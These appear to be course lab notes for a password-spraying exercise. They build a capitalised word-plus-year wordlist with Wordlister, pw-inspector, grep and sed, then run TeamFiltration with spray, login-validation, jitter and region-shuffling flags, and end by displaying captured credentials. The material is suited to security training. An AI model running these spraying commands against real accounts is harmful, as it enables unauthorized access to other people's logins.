## Create Wordlist in camel case format, that matches the syntax `SnakeJazz2020`

### 1. Add the years to the worldlist
```
echo "2019" >> /opt/Wordlister/words.txt
```
```
echo "2020" >> /opt/Wordlister/words.txt
```
```
echo "2021" >> /opt/Wordlister/words.txt
```
```
echo "2022" >> /opt/Wordlister/words.txt
```

### 2. Use the wordlister python script to manipulate the words.txt file 
```
python3 /opt/Wordlister/wordlister.py --cap --input /opt/Wordlister/words.txt --perm 3 --min 4 --max 30
```
> 
    --input: `words.txt is the output
    --cap: This capitalizes all the words
    --perm 3: This instructs Wordlister to make a permutation of 3 words
    --min 4: The minimum number of characters is 4
    --max 30: The maximum number of characters is 30


### 3. Remove junk words and put them in a text file called pw1.txt
```
cat /opt/Wordlister/output.txt  | grep -v '^20\|Tammy\|Terry\|Gummerman\|terry\|tammy\|jerry\|Jerry\|Smith\|Summer\Sleepy\|sleepy\|gary\|Gary' > /opt/Wordlister/pw1.txt
```

### 4. Remove all smallwords with `pw-inspector` from hydra
```
pw-inspector -i /opt/Wordlister/pw1.txt -o /opt/Wordlister/pw2.txt -m 13 -M 20 -c 3 -l -u -n
```

> 
    -m 13: minimum of 13
    -M 20: maximum of 20
    -c 3 : number of types required for character sets
    -l : lowercase characters
    -u : uppercase characters
    -n : numerical characters

### 5. Remove all words that do not reflect the desired syntax
```
sed '/^[[:lower:][:punct:]]/d' /opt/Wordlister/pw2.txt > /opt/Wordlister/pw3.txt
```

### 6. Only include words that end in numbers
```
grep -E '[0-9]$' /opt/Wordlister/pw3.txt > /opt/Wordlister/pw4.txt
```

### 7. Validate there should be about 30K passwords
```
cat /opt/Wordlister/pw4.txt | wc -l
```

### 8. Validate the correct syntax
```
cat /opt/Wordlister/pw4.txt | grep '^BirdPerson2021'
```

### 9. Use the Teamfiltration tool for password spraying
```
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 3 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/users.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions
```

This tool sometimes will crash unexpectedly where you will see errors like:

    Cannot resolve the Amazon API Gateway that was just created
    Too many Gateway request for delete at one time
    False negatives where this may occur in the middle of a scan

It is important to note that while this may seem like a problem, in many cases deleting the database can help you recover. Here is a simple way to do so:
```
rm -Rf /home/sec588/Coursefiles/workdir/teamfiltration
```
```
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/users.txt
```

### 10. View the results
```
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database
```

> 
    --usernames: A file containing the usernames
    --outpath: This is the location where the teamfiltration database will live
    --config: This is the configuration file to use
    --validate-login: Use the more "noisy" flag in this way it will have 1 bad password attempt per email address
    --spray: This is to perform a password spraying attack
    --sleep-min: This will set the minimal sleep interval (1 minutes)
    --sleep-max: This will set the maximum internal to wait (3 minutes)
    --jitter: This is the amount to jitter between maximum and minimum time intervals
    --usernames: This is the file containing usernames
    --passwords: This is the file containing passwords
    --shuffle-users: This command is to shuffle the usernames to test so that they are tested in different orders
    --shuffle-region: This command is to shuffle between regions


```
show creds
```
